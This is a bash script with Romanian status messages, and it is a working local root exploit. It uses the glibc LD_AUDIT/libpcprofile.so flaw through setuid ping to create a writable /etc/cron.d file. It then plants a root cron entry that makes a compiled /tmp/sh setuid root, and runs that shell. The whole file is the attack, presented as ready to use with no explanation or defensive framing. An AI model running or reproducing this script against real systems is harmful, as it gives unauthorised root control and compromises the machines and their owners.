#!/bin/bash

if [ ! -f /lib/libpcprofile.so ]; then
echo "(@)Nu este vulnerabil."
exit
fi

gcc -o /tmp/sh sh.c
echo "(@)Creez update in /etc/cron.d/updatedb"
umask 0
LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/updatedb" ping >/dev/null 2>&1
if [ ! -f /etc/cron.d/updatedb ]; then
echo "(@)Nu am putut creea /etc/cron.d/updatedb"
echo "(@)Nu este vulnerabil."
exit
fi

CTIME=$(/bin/date +%M)
echo "(@)Ceasu este:" $CTIME
STIME=$(/usr/bin/expr $CTIME + 2)

printf $STIME" * * * * root chown root.root /tmp/sh; chmod u+s /tmp/sh\n" >/etc/cron.d/updatedb
echo "(@)Vei lua login root in 2 minute.. asteapta"
sleep 120
echo "(@)Gata... felicitari"
/tmp/sh
